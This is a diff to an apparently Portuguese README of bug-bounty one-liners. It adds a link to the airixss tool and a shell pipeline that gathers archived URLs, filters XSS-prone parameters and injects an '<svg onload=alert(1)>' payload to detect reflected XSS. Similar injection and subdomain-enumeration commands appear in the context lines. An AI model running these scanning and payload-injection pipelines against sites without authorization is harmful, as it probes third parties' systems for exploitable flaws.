@@ -17,6 +17,8 @@ UMA SÉRIE DE ONELINERS PARA BUG BOUNTY
 
 [FREQ](https://github.com/takshal/freq)
 
+[AIRIXSS](https://github.com/ferreiraklet/airixss)
+
 ### subdominios
 ```bash
  subfinder -d yahoo.com -o domains ; echo "yahoo.com" | assetfinder | tee -a domains ; wait ; cat domains | anew subs
@@ -40,4 +42,9 @@ subfinder-d yahoo.com | httpx -status-code -mc 300
 
 ```bash
 echo "exemplo.com" | waybackurls | grep "=" | qsreplace "<script>alert(1)</script>" | freq 
+```
+### FINF WITH AIRIXSS
+
+```bash
+echo "exemplo.com" | waybackurls | gf xss | qsreplace "<svg onload=alert(1)>" | Airixss -payload "alert(1)" | egrep -v "Not"
 ```
